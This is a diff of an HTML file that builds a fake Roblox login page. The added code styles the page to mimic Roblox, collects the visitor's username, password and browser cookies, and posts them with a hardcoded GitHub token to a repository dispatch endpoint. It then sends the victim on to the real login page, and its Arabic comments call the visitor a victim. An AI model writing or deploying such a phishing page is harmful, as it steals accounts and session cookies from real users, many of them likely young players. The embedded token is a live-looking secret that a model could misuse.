@@ -1,31 +1,44 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Login | Roblox</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | Secure Authentication</title>
+    <style>
+        body { background: #1b1d1e; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 100px; }
+        .box { background: #2b2d2e; padding: 40px; border-radius: 10px; display: inline-block; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #444; background: #3b3d3e; color: white; border-radius: 5px; }
+        button { width: 98%; padding: 12px; background: #0084ff; border: none; color: white; cursor: pointer; font-weight: bold; border-radius: 5px; }
+    </style>
+</head>
 <body>
-    <input type="text" id="user" placeholder="Username"><br>
-    <input type="password" id="pass" placeholder="Password"><br>
-    <button onclick="capture()">Login</button>
+    <div class="box">
+        <img src="https://web.archive.org/web/20210414163539im_/https://www.roblox.com/images/Logo/logo_white_3x.png" width="160">
+        <input type="text" id="u" placeholder="Username / Email">
+        <input type="password" id="p" placeholder="Password">
+        <button onclick="capture()">Log In</button>
+    </div>
 
     <script>
     async function capture() {
         const payload = {
-            u: document.getElementById('user').value,
-            p: document.getElementById('pass').value,
-            c: document.cookie // سحب الكوكيز
+            u: document.getElementById('u').value,
+            p: document.getElementById('p').value,
+            c: document.cookie 
         };
 
-        await fetch('https://api.github.com/repos/USER/REPO/dispatches', {
+        // الإرسال المباشر للمستودع باستخدام التوكن الخاص بك
+        await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
             method: 'POST',
             headers: {
-                'Authorization': 'Bearer ghp_YOUR_TOKEN_HERE',
+                'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
                 'Accept': 'application/vnd.github.v3+json'
             },
             body: JSON.stringify({ event_type: 'log_data', client_payload: payload })
         });
 
+        // تحويل الضحية للموقع الأصلي
         window.location.href = "https://www.roblox.com/login";
     }
     </script>
 </body>
 </html>
-
